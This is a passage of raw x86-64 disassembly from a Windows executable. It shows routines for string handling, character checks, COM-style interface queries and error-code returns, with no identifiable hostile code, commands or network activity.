   14000259e:	74 0e                	je     0x1400025ae
   1400025a0:	48 8b d8             	mov    %rax,%rbx
   1400025a3:	41 bd 02 00 00 00    	mov    $0x2,%r13d
   1400025a9:	e9 c9 fe ff ff       	jmp    0x140002477
   1400025ae:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   1400025b2:	45 84 ff             	test   %r15b,%r15b
   1400025b5:	74 60                	je     0x140002617
   1400025b7:	66 83 3b 22          	cmpw   $0x22,(%rbx)
   1400025bb:	74 2a                	je     0x1400025e7
   1400025bd:	48 8d 15 ac 3a 02 00 	lea    0x23aac(%rip),%rdx        # 0x140026070
   1400025c4:	e8 5f 6f 01 00       	call   0x140019528
   1400025c9:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   1400025cd:	48 8b d3             	mov    %rbx,%rdx
   1400025d0:	e8 67 70 01 00       	call   0x14001963c
   1400025d5:	48 8d 15 94 3a 02 00 	lea    0x23a94(%rip),%rdx        # 0x140026070
   1400025dc:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   1400025e0:	e8 57 70 01 00       	call   0x14001963c
   1400025e5:	eb 08                	jmp    0x1400025ef
   1400025e7:	48 8b d3             	mov    %rbx,%rdx
   1400025ea:	e8 39 6f 01 00       	call   0x140019528
   1400025ef:	48 8d 0d f2 38 02 00 	lea    0x238f2(%rip),%rcx        # 0x140025ee8
   1400025f6:	33 d2                	xor    %edx,%edx
   1400025f8:	e8 8b 3e 00 00       	call   0x140006488
   1400025fd:	48 8b d8             	mov    %rax,%rbx
   140002600:	48 85 c0             	test   %rax,%rax
   140002603:	74 27                	je     0x14000262c
   140002605:	48 8d 15 4c 3b 02 00 	lea    0x23b4c(%rip),%rdx        # 0x140026158
   14000260c:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   140002610:	e8 27 70 01 00       	call   0x14001963c
   140002615:	eb 09                	jmp    0x140002620
   140002617:	48 8b 55 77          	mov    0x77(%rbp),%rdx
   14000261b:	e8 98 6f 01 00       	call   0x1400195b8
   140002620:	48 8d 4d 8f          	lea    -0x71(%rbp),%rcx
   140002624:	48 8b d3             	mov    %rbx,%rdx
   140002627:	e8 10 70 01 00       	call   0x14001963c
   14000262c:	48 8d 4d af          	lea    -0x51(%rbp),%rcx
   140002630:	e8 23 6e 01 00       	call   0x140019458
   140002635:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140002639:	48 8d 55 af          	lea    -0x51(%rbp),%rdx
   14000263d:	e8 46 12 00 00       	call   0x140003888
   140002642:	48 8d 4d 9f          	lea    -0x61(%rbp),%rcx
   140002646:	48 8b d0             	mov    %rax,%rdx
   140002649:	e8 42 6e 01 00       	call   0x140019490
   14000264e:	48 8d 4d af          	lea    -0x51(%rbp),%rcx
   140002652:	e8 a9 46 00 00       	call   0x140006d00
   140002657:	44 39 25 de a6 02 00 	cmp    %r12d,0x2a6de(%rip)        # 0x14002cd3c
   14000265e:	0f 85 12 01 00 00    	jne    0x140002776
   140002664:	45 85 ed             	test   %r13d,%r13d
   140002667:	74 0a                	je     0x140002673
   140002669:	41 83 fd 02          	cmp    $0x2,%r13d
   14000266d:	0f 85 03 01 00 00    	jne    0x140002776
   140002673:	48 8b 5d 7f          	mov    0x7f(%rbp),%rbx
   140002677:	66 44 39 23          	cmp    %r12w,(%rbx)
   14000267b:	74 18                	je     0x140002695
   14000267d:	48 8d 4d 9f          	lea    -0x61(%rbp),%rcx
   140002681:	48 8b d3             	mov    %rbx,%rdx
   140002684:	e8 b3 6f 01 00       	call   0x14001963c
   140002689:	eb 04                	jmp    0x14000268f
   14000268b:	48 83 c3 02          	add    $0x2,%rbx
   14000268f:	66 44 39 23          	cmp    %r12w,(%rbx)
   140002693:	75 f6                	jne    0x14000268b
   140002695:	48 8d 4d 9f          	lea    -0x61(%rbp),%rcx
   140002699:	e8 62 46 00 00       	call   0x140006d00
   14000269e:	45 84 f6             	test   %r14b,%r14b
   1400026a1:	0f 85 83 00 00 00    	jne    0x14000272a
   1400026a7:	4c 8d 45 af          	lea    -0x51(%rbp),%r8
   1400026ab:	48 8d 15 be 39 02 00 	lea    0x239be(%rip),%rdx        # 0x140026070
   1400026b2:	48 8d 4d df          	lea    -0x21(%rbp),%rcx
   1400026b6:	e8 59 6d 01 00       	call   0x140019414
   1400026bb:	4c 8d 05 6a 3a 02 00 	lea    0x23a6a(%rip),%r8        # 0x14002612c
   1400026c2:	48 8d 4d cf          	lea    -0x31(%rbp),%rcx
   1400026c6:	48 8b d0             	mov    %rax,%rdx
   1400026c9:	e8 02 6d 01 00       	call   0x1400193d0
   1400026ce:	4c 8d 45 9f          	lea    -0x61(%rbp),%r8
   1400026d2:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   1400026d6:	48 8b d0             	mov    %rax,%rdx
   1400026d9:	e8 c6 6c 01 00       	call   0x1400193a4
   1400026de:	48 8d 4d bf          	lea    -0x41(%rbp),%rcx
   1400026e2:	48 8b 10             	mov    (%rax),%rdx
   1400026e5:	e8 a6 6d 01 00       	call   0x140019490
   1400026ea:	48 8b 4d ef          	mov    -0x11(%rbp),%rcx
   1400026ee:	e8 7b 16 02 00       	call   0x140023d6e
   1400026f3:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   1400026f7:	e8 72 16 02 00       	call   0x140023d6e
   1400026fc:	48 8b 4d df          	mov    -0x21(%rbp),%rcx
   140002700:	e8 69 16 02 00       	call   0x140023d6e
   140002705:	4c 8b 45 67          	mov    0x67(%rbp),%r8
   140002709:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   14000270d:	8b d7                	mov    %edi,%edx
   14000270f:	e8 44 f8 ff ff       	call   0x140001f58
   140002714:	48 8b 4d bf          	mov    -0x41(%rbp),%rcx
   140002718:	85 c0                	test   %eax,%eax
   14000271a:	74 07                	je     0x140002723
   14000271c:	e8 4d 16 02 00       	call   0x140023d6e
   140002721:	eb 53                	jmp    0x140002776
   140002723:	e8 46 16 02 00       	call   0x140023d6e
   140002728:	eb 1c                	jmp    0x140002746
   14000272a:	48 8b 55 9f          	mov    -0x61(%rbp),%rdx
   14000272e:	48 8b 4d af          	mov    -0x51(%rbp),%rcx
   140002732:	44 8b c7             	mov    %edi,%r8d
   140002735:	e8 5e f9 ff ff       	call   0x140002098
   14000273a:	85 c0                	test   %eax,%eax
   14000273c:	74 38                	je     0x140002776
   14000273e:	8b c8                	mov    %eax,%ecx
   140002740:	ff 15 b2 2b 02 00    	call   *0x22bb2(%rip)        # 0x1400252f8
   140002746:	f6 05 13 a4 02 00 10 	testb  $0x10,0x2a413(%rip)        # 0x14002cb60
   14000274d:	74 0d                	je     0x14000275c
   14000274f:	ff 15 23 2c 02 00    	call   *0x22c23(%rip)        # 0x140025378
   140002755:	3d c7 04 00 00       	cmp    $0x4c7,%eax
   14000275a:	74 10                	je     0x14000276c
   14000275c:	4c 8b 45 8f          	mov    -0x71(%rbp),%r8
   140002760:	ba 10 00 00 00       	mov    $0x10,%edx
   140002765:	8b ce                	mov    %esi,%ecx
   140002767:	e8 18 9d 00 00       	call   0x14000c484
   14000276c:	e8 d3 4c 00 00       	call   0x140007444
   140002771:	be 09 00 00 00       	mov    $0x9,%esi
   140002776:	48 8b 4d 9f          	mov    -0x61(%rbp),%rcx
   14000277a:	e8 ef 15 02 00       	call   0x140023d6e
   14000277f:	48 8b 4d af          	mov    -0x51(%rbp),%rcx
   140002783:	e8 e6 15 02 00       	call   0x140023d6e
   140002788:	48 8d 4d ff          	lea    -0x1(%rbp),%rcx
   14000278c:	e8 67 10 00 00       	call   0x1400037f8
   140002791:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140002795:	e8 d4 15 02 00       	call   0x140023d6e
   14000279a:	48 8b 9c 24 f0 00 00 	mov    0xf0(%rsp),%rbx
   1400027a1:	00 
   1400027a2:	8b c6                	mov    %esi,%eax
   1400027a4:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   1400027ab:	41 5f                	pop    %r15
   1400027ad:	41 5e                	pop    %r14
   1400027af:	41 5d                	pop    %r13
   1400027b1:	41 5c                	pop    %r12
   1400027b3:	5f                   	pop    %rdi
   1400027b4:	5e                   	pop    %rsi
   1400027b5:	5d                   	pop    %rbp
   1400027b6:	c3                   	ret
   1400027b7:	cc                   	int3
   1400027b8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400027bd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400027c2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400027c7:	55                   	push   %rbp
   1400027c8:	41 54                	push   %r12
   1400027ca:	41 55                	push   %r13
   1400027cc:	41 56                	push   %r14
   1400027ce:	41 57                	push   %r15
   1400027d0:	48 8b ec             	mov    %rsp,%rbp
   1400027d3:	48 83 ec 50          	sub    $0x50,%rsp
   1400027d7:	4c 8b ea             	mov    %rdx,%r13
   1400027da:	48 8b f1             	mov    %rcx,%rsi
   1400027dd:	48 8b d1             	mov    %rcx,%rdx
   1400027e0:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400027e4:	45 33 ff             	xor    %r15d,%r15d
   1400027e7:	4d 8b e1             	mov    %r9,%r12
   1400027ea:	49 8b d8             	mov    %r8,%rbx
   1400027ed:	44 89 7d 40          	mov    %r15d,0x40(%rbp)
   1400027f1:	e8 9a 6c 01 00       	call   0x140019490
   1400027f6:	44 8b 55 e8          	mov    -0x18(%rbp),%r10d
   1400027fa:	0f b7 3b             	movzwl (%rbx),%edi
   1400027fd:	44 39 55 ec          	cmp    %r10d,-0x14(%rbp)
   140002801:	75 0d                	jne    0x140002810
   140002803:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002807:	e8 a0 69 01 00       	call   0x1400191ac
   14000280c:	44 8b 55 e8          	mov    -0x18(%rbp),%r10d
   140002810:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140002814:	4c 8b 75 50          	mov    0x50(%rbp),%r14
   140002818:	41 8b c2             	mov    %r10d,%eax
   14000281b:	41 ff c2             	inc    %r10d
   14000281e:	66 89 3c 41          	mov    %di,(%rcx,%rax,2)
   140002822:	66 46 89 3c 51       	mov    %r15w,(%rcx,%r10,2)
   140002827:	44 89 55 e8          	mov    %r10d,-0x18(%rbp)
   14000282b:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000282f:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   140002833:	e8 50 3c 00 00       	call   0x140006488
   140002838:	48 85 c0             	test   %rax,%rax
   14000283b:	75 6d                	jne    0x1400028aa
   14000283d:	48 83 c3 02          	add    $0x2,%rbx
   140002841:	66 83 3b 30          	cmpw   $0x30,(%rbx)
   140002845:	72 06                	jb     0x14000284d
   140002847:	66 83 3b 39          	cmpw   $0x39,(%rbx)
   14000284b:	76 20                	jbe    0x14000286d
   14000284d:	66 83 3b 61          	cmpw   $0x61,(%rbx)
   140002851:	72 06                	jb     0x140002859
   140002853:	66 83 3b 7a          	cmpw   $0x7a,(%rbx)
   140002857:	76 14                	jbe    0x14000286d
   140002859:	66 83 3b 41          	cmpw   $0x41,(%rbx)
   14000285d:	0f 82 8f 00 00 00    	jb     0x1400028f2
   140002863:	66 83 3b 5a          	cmpw   $0x5a,(%rbx)
   140002867:	0f 87 85 00 00 00    	ja     0x1400028f2
   14000286d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002871:	48 8b d6             	mov    %rsi,%rdx
   140002874:	e8 af 6c 01 00       	call   0x140019528
   140002879:	8b 55 e8             	mov    -0x18(%rbp),%edx
   14000287c:	0f b7 3b             	movzwl (%rbx),%edi
   14000287f:	39 55 ec             	cmp    %edx,-0x14(%rbp)
   140002882:	75 0c                	jne    0x140002890
   140002884:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140002888:	e8 1f 69 01 00       	call   0x1400191ac
   14000288d:	8b 55 e8             	mov    -0x18(%rbp),%edx
   140002890:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140002894:	8b c2                	mov    %edx,%eax
   140002896:	ff c2                	inc    %edx
   140002898:	66 89 3c 41          	mov    %di,(%rcx,%rax,2)
   14000289c:	66 44 89 3c 51       	mov    %r15w,(%rcx,%rdx,2)
   1400028a1:	89 55 e8             	mov    %edx,-0x18(%rbp)
   1400028a4:	44 89 7d 40          	mov    %r15d,0x40(%rbp)
   1400028a8:	eb 81                	jmp    0x14000282b
   1400028aa:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400028ae:	48 8b d0             	mov    %rax,%rdx
   1400028b1:	e8 da 6b 01 00       	call   0x140019490
   1400028b6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400028ba:	4d 8b cc             	mov    %r12,%r9
   1400028bd:	45 33 c0             	xor    %r8d,%r8d
   1400028c0:	49 8b d5             	mov    %r13,%rdx
   1400028c3:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   1400028c8:	e8 4b fb ff ff       	call   0x140002418
   1400028cd:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400028d1:	e8 98 14 02 00       	call   0x140023d6e
   1400028d6:	49 8b 04 24          	mov    (%r12),%rax
   1400028da:	45 89 7c 24 08       	mov    %r15d,0x8(%r12)
   1400028df:	66 44 89 38          	mov    %r15w,(%rax)
   1400028e3:	ff 45 40             	incl   0x40(%rbp)
   1400028e6:	4c 8d 35 d3 37 02 00 	lea    0x237d3(%rip),%r14        # 0x1400260c0
   1400028ed:	e9 39 ff ff ff       	jmp    0x14000282b
   1400028f2:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400028f6:	e8 73 14 02 00       	call   0x140023d6e
   1400028fb:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   140002900:	b8 01 00 00 00       	mov    $0x1,%eax
   140002905:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002909:	49 8b 73 38          	mov    0x38(%r11),%rsi
   14000290d:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140002911:	49 8b e3             	mov    %r11,%rsp
   140002914:	41 5f                	pop    %r15
   140002916:	41 5e                	pop    %r14
   140002918:	41 5d                	pop    %r13
   14000291a:	41 5c                	pop    %r12
   14000291c:	5d                   	pop    %rbp
   14000291d:	c3                   	ret
   14000291e:	cc                   	int3
   14000291f:	cc                   	int3
   140002920:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140002925:	48 83 ec 28          	sub    $0x28,%rsp
   140002929:	f6 05 30 a2 02 00 01 	testb  $0x1,0x2a230(%rip)        # 0x14002cb60
   140002930:	75 58                	jne    0x14000298a
   140002932:	48 8b 0d a7 a3 02 00 	mov    0x2a3a7(%rip),%rcx        # 0x14002cce0
   140002939:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000293e:	45 33 c9             	xor    %r9d,%r9d
   140002941:	45 33 c0             	xor    %r8d,%r8d
   140002944:	ff 15 a6 29 02 00    	call   *0x229a6(%rip)        # 0x1400252f0
   14000294a:	85 c0                	test   %eax,%eax
   14000294c:	74 3c                	je     0x14000298a
   14000294e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002953:	48 39 44 24 40       	cmp    %rax,0x40(%rsp)
   140002958:	73 30                	jae    0x14000298a
   14000295a:	b9 2a 00 00 00       	mov    $0x2a,%ecx
   14000295f:	e8 3c 21 00 00       	call   0x140004aa0
   140002964:	48 8b c8             	mov    %rax,%rcx
   140002967:	e8 70 9a 00 00       	call   0x14000c3dc
   14000296c:	48 83 f8 01          	cmp    $0x1,%rax
   140002970:	74 11                	je     0x140002983
   140002972:	c7 05 5c a1 02 00 6a 	movl   $0x6a,0x2a15c(%rip)        # 0x14002cad8
   140002979:	00 00 00 
   14000297c:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140002981:	eb 23                	jmp    0x1400029a6
   140002983:	83 0d d6 a1 02 00 01 	orl    $0x1,0x2a1d6(%rip)        # 0x14002cb60
   14000298a:	48 8b 0d 8f a3 02 00 	mov    0x2a38f(%rip),%rcx        # 0x14002cd20
   140002991:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140002996:	45 33 c0             	xor    %r8d,%r8d
   140002999:	ba 01 80 00 00       	mov    $0x8001,%edx
   14000299e:	ff 15 0c 2c 02 00    	call   *0x22c0c(%rip)        # 0x1400255b0
   1400029a4:	33 c0                	xor    %eax,%eax
   1400029a6:	48 83 c4 28          	add    $0x28,%rsp
   1400029aa:	c3                   	ret
   1400029ab:	cc                   	int3
   1400029ac:	48 83 ec 28          	sub    $0x28,%rsp
   1400029b0:	83 3d 65 a3 02 00 00 	cmpl   $0x0,0x2a365(%rip)        # 0x14002cd1c
   1400029b7:	74 07                	je     0x1400029c0
   1400029b9:	b8 04 40 00 80       	mov    $0x80004004,%eax
   1400029be:	eb 1f                	jmp    0x1400029df
   1400029c0:	48 85 d2             	test   %rdx,%rdx
   1400029c3:	74 18                	je     0x1400029dd
   1400029c5:	48 8b 0d 54 a3 02 00 	mov    0x2a354(%rip),%rcx        # 0x14002cd20
   1400029cc:	4c 8b ca             	mov    %rdx,%r9
   1400029cf:	45 33 c0             	xor    %r8d,%r8d
   1400029d2:	ba 02 80 00 00       	mov    $0x8002,%edx
   1400029d7:	ff 15 d3 2b 02 00    	call   *0x22bd3(%rip)        # 0x1400255b0
   1400029dd:	33 c0                	xor    %eax,%eax
   1400029df:	48 83 c4 28          	add    $0x28,%rsp
   1400029e3:	c3                   	ret
   1400029e4:	83 61 28 00          	andl   $0x0,0x28(%rcx)
   1400029e8:	8b 41 28             	mov    0x28(%rcx),%eax
   1400029eb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400029f1:	85 d2                	test   %edx,%edx
   1400029f3:	41 0f 44 c0          	cmove  %r8d,%eax
   1400029f7:	89 41 28             	mov    %eax,0x28(%rcx)
   1400029fa:	33 c0                	xor    %eax,%eax
   1400029fc:	c3                   	ret
   1400029fd:	cc                   	int3
   1400029fe:	cc                   	int3
   1400029ff:	cc                   	int3
   140002a00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a05:	57                   	push   %rdi
   140002a06:	48 83 ec 20          	sub    $0x20,%rsp
   140002a0a:	48 8b f9             	mov    %rcx,%rdi
   140002a0d:	41 8b c8             	mov    %r8d,%ecx
   140002a10:	8b da                	mov    %edx,%ebx
   140002a12:	ff 15 e0 28 02 00    	call   *0x228e0(%rip)        # 0x1400252f8
   140002a18:	83 fb 6a             	cmp    $0x6a,%ebx
   140002a1b:	75 05                	jne    0x140002a22
   140002a1d:	8d 53 b4             	lea    -0x4c(%rbx),%edx
   140002a20:	eb 08                	jmp    0x140002a2a
   140002a22:	83 fb 69             	cmp    $0x69,%ebx
   140002a25:	75 11                	jne    0x140002a38
   140002a27:	8d 53 b6             	lea    -0x4a(%rbx),%edx
   140002a2a:	4c 8b 47 40          	mov    0x40(%rdi),%r8
   140002a2e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002a33:	e8 4c 9a 00 00       	call   0x14000c484
   140002a38:	48 8b 07             	mov    (%rdi),%rax
   140002a3b:	8b d3                	mov    %ebx,%edx
   140002a3d:	48 8b cf             	mov    %rdi,%rcx
   140002a40:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002a45:	48 83 c4 20          	add    $0x20,%rsp
   140002a49:	5f                   	pop    %rdi
   140002a4a:	48 ff 60 38          	rex.W jmp *0x38(%rax)
   140002a4e:	cc                   	int3
   140002a4f:	cc                   	int3
   140002a50:	40 53                	rex push %rbx
   140002a52:	48 83 ec 20          	sub    $0x20,%rsp
   140002a56:	48 8b d9             	mov    %rcx,%rbx
   140002a59:	48 8b ca             	mov    %rdx,%rcx
   140002a5c:	e8 5f e7 ff ff       	call   0x1400011c0
   140002a61:	85 c0                	test   %eax,%eax
   140002a63:	74 15                	je     0x140002a7a
   140002a65:	48 8d 4b f8          	lea    -0x8(%rbx),%rcx
   140002a69:	ba 6b 00 00 00       	mov    $0x6b,%edx
   140002a6e:	48 8b 01             	mov    (%rcx),%rax
   140002a71:	48 83 c4 20          	add    $0x20,%rsp
   140002a75:	5b                   	pop    %rbx
   140002a76:	48 ff 60 38          	rex.W jmp *0x38(%rax)
   140002a7a:	33 c0                	xor    %eax,%eax
   140002a7c:	48 83 c4 20          	add    $0x20,%rsp
   140002a80:	5b                   	pop    %rbx
   140002a81:	c3                   	ret
   140002a82:	cc                   	int3
   140002a83:	cc                   	int3
   140002a84:	40 53                	rex push %rbx
   140002a86:	48 83 ec 20          	sub    $0x20,%rsp
   140002a8a:	48 8b c2             	mov    %rdx,%rax
   140002a8d:	8b d9                	mov    %ecx,%ebx
   140002a8f:	48 8d 15 8a 35 02 00 	lea    0x2358a(%rip),%rdx        # 0x140026020
   140002a96:	48 8b c8             	mov    %rax,%rcx
   140002a99:	e8 32 61 01 00       	call   0x140018bd0
   140002a9e:	85 c0                	test   %eax,%eax
   140002aa0:	75 1d                	jne    0x140002abf
   140002aa2:	8b cb                	mov    %ebx,%ecx
   140002aa4:	e8 3f 66 00 00       	call   0x1400090e8
   140002aa9:	84 c0                	test   %al,%al
   140002aab:	75 12                	jne    0x140002abf
   140002aad:	8b cb                	mov    %ebx,%ecx
   140002aaf:	e8 68 67 00 00       	call   0x14000921c
   140002ab4:	84 c0                	test   %al,%al
   140002ab6:	75 07                	jne    0x140002abf
   140002ab8:	b8 01 00 00 00       	mov    $0x1,%eax
   140002abd:	eb 02                	jmp    0x140002ac1
   140002abf:	33 c0                	xor    %eax,%eax
   140002ac1:	48 83 c4 20          	add    $0x20,%rsp
   140002ac5:	5b                   	pop    %rbx
   140002ac6:	c3                   	ret
   140002ac7:	cc                   	int3
   140002ac8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002acd:	33 c0                	xor    %eax,%eax
   140002acf:	4d 8b d8             	mov    %r8,%r11
   140002ad2:	48 8d 1d 27 d5 ff ff 	lea    -0x2ad9(%rip),%rbx        # 0x140000000
   140002ad9:	49 89 00             	mov    %rax,(%r8)
   140002adc:	4c 8b 02             	mov    (%rdx),%r8
   140002adf:	4c 8b ca             	mov    %rdx,%r9
   140002ae2:	4c 3b 83 a0 89 02 00 	cmp    0x289a0(%rbx),%r8
   140002ae9:	75 11                	jne    0x140002afc
   140002aeb:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140002aef:	4c 3b 83 a8 89 02 00 	cmp    0x289a8(%rbx),%r8
   140002af6:	75 04                	jne    0x140002afc
   140002af8:	8b d0                	mov    %eax,%edx
   140002afa:	eb 05                	jmp    0x140002b01
   140002afc:	1b d2                	sbb    %edx,%edx
   140002afe:	83 da ff             	sbb    $0xffffffff,%edx
   140002b01:	85 d2                	test   %edx,%edx
   140002b03:	74 26                	je     0x140002b2b
   140002b05:	4d 8b 01             	mov    (%r9),%r8
   140002b08:	4c 3b 83 50 5a 02 00 	cmp    0x25a50(%rbx),%r8
   140002b0f:	75 11                	jne    0x140002b22
   140002b11:	4d 8b 41 08          	mov    0x8(%r9),%r8
   140002b15:	4c 3b 83 58 5a 02 00 	cmp    0x25a58(%rbx),%r8
   140002b1c:	75 04                	jne    0x140002b22
   140002b1e:	8b d0                	mov    %eax,%edx
   140002b20:	eb 05                	jmp    0x140002b27
   140002b22:	1b d2                	sbb    %edx,%edx
   140002b24:	83 da ff             	sbb    $0xffffffff,%edx
   140002b27:	85 d2                	test   %edx,%edx
   140002b29:	75 13                	jne    0x140002b3e
   140002b2b:	48 85 c9             	test   %rcx,%rcx
   140002b2e:	74 04                	je     0x140002b34
   140002b30:	48 8d 41 08          	lea    0x8(%rcx),%rax
   140002b34:	49 89 03             	mov    %rax,(%r11)
   140002b37:	ff 41 10             	incl   0x10(%rcx)
   140002b3a:	33 c0                	xor    %eax,%eax
   140002b3c:	eb 05                	jmp    0x140002b43
   140002b3e:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140002b43:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140002b48:	c3                   	ret
   140002b49:	cc                   	int3
   140002b4a:	cc                   	int3
   140002b4b:	cc                   	int3
   140002b4c:	48 83 e9 08          	sub    $0x8,%rcx
   140002b50:	e9 73 ff ff ff       	jmp    0x140002ac8
   140002b55:	cc                   	int3
   140002b56:	cc                   	int3
   140002b57:	cc                   	int3
   140002b58:	48 83 e9 08          	sub    $0x8,%rcx
   140002b5c:	e9 d3 e6 ff ff       	jmp    0x140001234
   140002b61:	cc                   	int3
   140002b62:	cc                   	int3
   140002b63:	cc                   	int3
   140002b64:	40 53                	rex push %rbx
   140002b66:	48 83 ec 20          	sub    $0x20,%rsp
   140002b6a:	48 8b d9             	mov    %rcx,%rbx
   140002b6d:	85 d2                	test   %edx,%edx
   140002b6f:	74 0d                	je     0x140002b7e
   140002b71:	89 15 61 9f 02 00    	mov    %edx,0x29f61(%rip)        # 0x14002cad8
   140002b77:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140002b7c:	eb 41                	jmp    0x140002bbf
   140002b7e:	48 83 79 38 00       	cmpq   $0x0,0x38(%rcx)
   140002b83:	74 11                	je     0x140002b96
   140002b85:	48 8d 51 5c          	lea    0x5c(%rcx),%rdx
   140002b89:	48 8b 49 30          	mov    0x30(%rcx),%rcx
   140002b8d:	48 83 c1 10          	add    $0x10,%rcx
   140002b91:	e8 be 5c 01 00       	call   0x140018854
   140002b96:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140002b9a:	48 85 c9             	test   %rcx,%rcx
   140002b9d:	74 0b                	je     0x140002baa
   140002b9f:	48 8b 01             	mov    (%rcx),%rax
   140002ba2:	ff 50 10             	call   *0x10(%rax)
   140002ba5:	48 83 63 38 00       	andq   $0x0,0x38(%rbx)
   140002baa:	83 7b 28 00          	cmpl   $0x0,0x28(%rbx)
   140002bae:	74 0d                	je     0x140002bbd
   140002bb0:	8b 53 68             	mov    0x68(%rbx),%edx
   140002bb3:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140002bb7:	ff 15 2b 27 02 00    	call   *0x2272b(%rip)        # 0x1400252e8
   140002bbd:	33 c0                	xor    %eax,%eax
   140002bbf:	48 83 c4 20          	add    $0x20,%rsp
   140002bc3:	5b                   	pop    %rbx
   140002bc4:	c3                   	ret
   140002bc5:	cc                   	int3
   140002bc6:	cc                   	int3
   140002bc7:	cc                   	int3
   140002bc8:	40 53                	rex push %rbx
   140002bca:	48 83 ec 30          	sub    $0x30,%rsp
   140002bce:	83 3d 87 9f 02 00 02 	cmpl   $0x2,0x29f87(%rip)        # 0x14002cb5c
   140002bd5:	48 8b d9             	mov    %rcx,%rbx
   140002bd8:	74 17                	je     0x140002bf1
   140002bda:	eb 0b                	jmp    0x140002be7
   140002bdc:	b9 14 00 00 00       	mov    $0x14,%ecx
   140002be1:	ff 15 f9 26 02 00    	call   *0x226f9(%rip)        # 0x1400252e0
   140002be7:	48 83 3d 31 a1 02 00 	cmpq   $0x0,0x2a131(%rip)        # 0x14002cd20
   140002bee:	00 
   140002bef:	74 eb                	je     0x140002bdc
   140002bf1:	33 d2                	xor    %edx,%edx
   140002bf3:	41 83 c8 ff          	or     $0xffffffff,%r8d
   140002bf7:	39 53 58             	cmp    %edx,0x58(%rbx)
   140002bfa:	76 0e                	jbe    0x140002c0a
   140002bfc:	48 39 53 50          	cmp    %rdx,0x50(%rbx)
   140002c00:	74 08                	je     0x140002c0a
   140002c02:	48 8b 53 50          	mov    0x50(%rbx),%rdx
   140002c06:	44 8b 43 58          	mov    0x58(%rbx),%r8d
   140002c0a:	48 8b 0d bf 9f 02 00 	mov    0x29fbf(%rip),%rcx        # 0x14002cbd0
   140002c11:	45 33 c9             	xor    %r9d,%r9d
   140002c14:	83 3d 21 a1 02 00 02 	cmpl   $0x2,0x2a121(%rip)        # 0x14002cd3c
   140002c1b:	48 8b 01             	mov    (%rcx),%rax
   140002c1e:	41 0f 94 c1          	sete   %r9b
   140002c22:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002c27:	ff 50 38             	call   *0x38(%rax)
   140002c2a:	83 3d 2b 9f 02 00 02 	cmpl   $0x2,0x29f2b(%rip)        # 0x14002cb5c
   140002c31:	8b d8                	mov    %eax,%ebx
   140002c33:	74 14                	je     0x140002c49
   140002c35:	48 8b 0d e4 a0 02 00 	mov    0x2a0e4(%rip),%rcx        # 0x14002cd20
   140002c3c:	48 85 c9             	test   %rcx,%rcx
   140002c3f:	74 08                	je     0x140002c49
   140002c41:	33 d2                	xor    %edx,%edx
   140002c43:	ff 15 8f 29 02 00    	call   *0x2298f(%rip)        # 0x1400255d8
   140002c49:	8b c3                	mov    %ebx,%eax
   140002c4b:	48 83 c4 30          	add    $0x30,%rsp
   140002c4f:	5b                   	pop    %rbx
   140002c50:	c3                   	ret
   140002c51:	cc                   	int3
   140002c52:	cc                   	int3
   140002c53:	cc                   	int3
   140002c54:	49 83 20 00          	andq   $0x0,(%r8)
   140002c58:	4c 8b 12             	mov    (%rdx),%r10
   140002c5b:	4c 8d 1d 9e d3 ff ff 	lea    -0x2c62(%rip),%r11        # 0x140000000
   140002c62:	4d 8b c8             	mov    %r8,%r9
   140002c65:	4d 3b 93 a0 89 02 00 	cmp    0x289a0(%r11),%r10
   140002c6c:	75 11                	jne    0x140002c7f
   140002c6e:	4c 8b 52 08          	mov    0x8(%rdx),%r10
   140002c72:	4d 3b 93 a8 89 02 00 	cmp    0x289a8(%r11),%r10
   140002c79:	75 04                	jne    0x140002c7f
   140002c7b:	33 c0                	xor    %eax,%eax
   140002c7d:	eb 05                	jmp    0x140002c84
   140002c7f:	1b c0                	sbb    %eax,%eax
   140002c81:	83 d8 ff             	sbb    $0xffffffff,%eax
   140002c84:	85 c0                	test   %eax,%eax
